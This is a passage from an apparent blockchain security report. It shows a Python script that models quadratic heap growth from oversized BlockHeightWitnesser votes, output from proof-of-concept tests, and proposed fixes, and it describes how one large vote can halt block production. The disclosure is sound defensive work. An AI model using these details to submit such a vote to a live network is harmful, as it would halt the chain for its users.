    print(f"    ({h}*L*(L+1)/2: L={l_ideal} -> {h * l_ideal * (l_ideal + 1) // 2:,} B; "
          f"L={l_ideal + 1} -> {h * (l_ideal + 1) * (l_ideal + 2) // 2:,} B)")
    print(f"  * prefix buffers + BTree nodes            : L = {l_buffers_only}")
    print(f"  * + the `self.votes.clone()` copy         : L = {l_model}   <-- realistic")
    print()
    exact = {"ideal_L": l_ideal, "buffers_plus_nodes_L": l_buffers_only, "realistic_L": l_model}
    out["thresholds"] = exact
    out["rows"] = rows
    out["constants"] = {"page_bytes": PAGE_BYTES, "extra_heap_pages": EXTRA_HEAP_PAGES,
                        "wasm_heap_bytes": WASM_HEAP_BYTES,
                        "operational_limit": OPERATIONAL_LIMIT,
                        "declared_weight": WEIGHT_DECLARED,
                        "btreemap_per_entry_bytes": BSTREEMAP_PER_ENTRY_BYTES}

    print("sanity: with 72-byte headers the pure quadratic term is 36*L^2 bytes;")
    print(f"  L = 1930 -> 36*1930^2 = {36 * 1930 ** 2:,} B = {36 * 1930 ** 2 / 2**20:.2f} MiB "
          f"({'just under' if 36 * 1930 ** 2 < WASM_HEAP_BYTES else 'over'} the cap)")
    print(f"  L = 1931 -> 36*1931^2 = {36 * 1931 ** 2:,} B = {36 * 1931 ** 2 / 2**20:.2f} MiB "
          f"({'over' if 36 * 1931 ** 2 > WASM_HEAP_BYTES else 'under'} the cap)")
    check("36*L^2 crosses 128 MiB exactly between L=1930 and L=1931",
          36 * 1930 ** 2 < WASM_HEAP_BYTES < 36 * 1931 ** 2)
    check("a single ~140 KB vote is enough to cross the cap once the map bookkeeping is counted",
          l_model * h <= OPERATIONAL_LIMIT, f"{l_model} headers = {l_model * h:,} bytes")
    check("the declared weight does not depend on the payload (65.6 us regardless of L)",
          WEIGHT_DECLARED[0] / BLOCK_WEIGHT_REF_TIME < 0.001)

    # ---- live context (optional, one storage read per chain) ---------------------------------
    if args.live:
        print()
        print("-" * 100)
        print("LIVE CONTEXT: the public block height each BHW queries (`witness_from_index`)")
        print("-" * 100)
        chains = [("Bitcoin", "BitcoinChainTracking"), ("Ethereum", "EthereumChainTracking"),
                  ("Arbitrum", "ArbitrumChainTracking"), ("Tron", "TronChainTracking")]
        live = {}
        for name, prefix in chains:
            raw = get_storage(storage_key(prefix, "CurrentChainState"))
            height = decode_u64(raw)
            live[name] = height
            print(f"  {name:<9} ChainTracking height = {height:>12,}   "
                  f"-> a valid Running vote must start at {height + 1:,} "
                  f"(BlockHeightWitnesser::validate, state_machine.rs:69-83)")
        n_auth = decode_compact_len(get_storage(storage_key("Validator", "CurrentAuthorities")))
        if n_auth:
            thr = (2 * n_auth - 1) // 3 + 1
            print(f"  authorities = {n_auth}, consensus threshold (2n-1)/3+1 = {thr}")
            print("  (the memory blow-up needs only ONE vote: the prefixes are built before any "
                  "threshold is evaluated)")
            live["authorities"] = n_auth
            live["threshold"] = thr
        out["live"] = live

    print()
    ok = all(c["ok"] for c in out["checks"])
    print(f"RESULT: {sum(1 for c in out['checks'] if c['ok'])}/{len(out['checks'])} "
          f"arithmetic checks passed")
    out["all_checks_passed"] = ok
    if args.json:
        with open(args.json, "w") as f:
            json.dump(out, f, indent=1)
        print(f"(json written to {args.json})")
    if args.do_assert and not ok:
        print("ASSERTION FAILED", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
```

### 6.3 Execution evidence (verbatim, 2026-09-23)

```text
running 2 tests
test electoral_systems::tests::bhw_vote_oom::poc_bhw_heap_scaling_table ... L=  250  model      2304500 B (   2.2 MiB)  cumulative peak RSS delta None
L=  500  model      9109000 B (   8.7 MiB)  cumulative peak RSS delta None
L= 1000  model     36218000 B (  34.5 MiB)  cumulative peak RSS delta None
L= 1930  model    134517140 B ( 128.3 MiB)  cumulative peak RSS delta None
ok
test electoral_systems::tests::bhw_vote_oom::poc_bhw_single_large_vote_exhausts_the_wasm_heap ... vote: L=1930 headers = 138960 B on the wire; retained model = 134165880 B (prefixes) + 138960 B (votes.clone) + 212300 B (BTreeMap) = 134517140 B (128.3 MiB) vs wasm heap 134217728 B (128 MiB)
/proc/self/status unavailable (non-Linux host): RSS measurement skipped; the model still exceeds the wasm heap
=> on wasm this allocation fails inside on_finalize: the block containing the vote cannot be produced and the (Immortal) tx stays pending.
ok

test result: ok. 2 passed; 0 failed; 0 ignored; 0 measured; 102 filtered out; finished in 0.14s
```

The macOS peak-RSS measurement of the scaling ladder (`/usr/bin/time -l`, step 3 above) returned a maximum resident set size of 161,660,928 bytes (154.2 MiB) for the process that runs L = 250, 500, 1000, 1930 in order, confirming the quadratic retention is real allocation, not model arithmetic. What remains unexecuted, stated plainly: the wasm-side trap itself, which needs a local dev node (the Static-heap arithmetic plus the native run make it certain), and the network-wide halt, which would require submitting the vote to a live chain. Neither was done.

## 7. Suggested Fix

Primary (bound the payload): give `NonemptyContinuousHeaders` an enforced maximum header count, either in the defx validation or via a `BoundedVec`, so a vote longer than the honest engine cap (16, or the largest realistic catch-up window) is rejected at decode time. This alone closes the OOM because L can no longer approach 1,928.

Secondary (charge for the payload): re-benchmark the vote weight with the header count as a component, so the extrinsic pays for the bytes it submits instead of the flat 65.6 microseconds, and let the 2-second block budget enforce the real cost.

Tertiary (remove the quadratic): replace the retain-every-prefix staging in `check_consensus` with an aggregation that computes per-suffix consensus in linear memory (the staged BTreeMap of full prefix clones is the memory sink), and audit every other `on_finalize` path for allocations that scale with extrinsic-controlled input.

Defensive (make the halt self-healing): because a trapped `finalize_block` gives the author no signal about which transaction poisoned it, add a deterministic skip-list or pool flag so a transaction whose inclusion causes a build failure is dropped after the first failure instead of being retried by every subsequent author.
